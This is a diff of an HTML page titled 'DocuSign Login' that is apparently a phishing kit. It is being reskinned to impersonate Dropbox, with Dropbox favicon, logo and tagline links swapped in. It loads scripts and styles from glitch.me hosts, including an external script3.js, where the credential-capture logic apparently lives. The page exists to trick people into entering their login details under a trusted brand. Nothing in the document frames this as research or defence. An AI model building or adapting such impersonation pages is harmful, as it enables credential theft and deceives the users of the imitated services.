@@ -1,11 +1,12 @@
 
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 
 <head>
 
 <title>DocuSign Login</title> 
-<link rel="shortcut icon" href="https://www.docusign.com/sites/all/themes/custom/docusign/favicons/favicon.ico">
+<link rel="shortcut icon" href="https://aem.dropbox.com/cms/content/dam/dropbox/aem/favicon32.ico">
 <meta name="viewport" content="initial-scale=1, width=device-width">
 
 
@@ -20,14 +21,14 @@
 </script>
 <script src="https://slender-lumbar-mortarboard.glitch.me/script3.js">
 </script>
-<link rel="stylesheet" href="https://believed-beneficial-tourmaline.glitch.me/style1.css">
+<link rel="stylesheet" href="https://slender-lumbar-mortarboard.glitch.me/style1.css">
 </head>
 
 
 <body>
 <div id="Layer1" style="position:absolute; left:148px; top:425px; 
 
-width:998px; height:290px; z-index:1">
+width:998px; height:190px; z-index:1">
   
 </div> <p> </p><p>
 </p><div id="heading_tab"> 
@@ -47,7 +48,7 @@ width:998px; height:290px; z-index:1">
 </div>
 
 <div id="central_dv">
-  <img src="https://independant.io/wp-content/uploads/docusign_logo.png" style="max-width: 220px;">
+  <img src="http://dropboxstatic.com/static/images/brand/spacing-vflgKqAuk.png" style="max-width: 350px;">
   <p> 
   <span class="style2">
   <blink class="content style3">
@@ -68,7 +69,8 @@ Please log in to your account
     <br>
   </p>
   <div align="center">
-    <p class="style1">No account ? Sign up for free</p>
+<p class="style1">Log in or sign up</p>
+    <p class="style1">One Dropbox account. Infinite possibilities. </p>
   </div>
 </div>
 
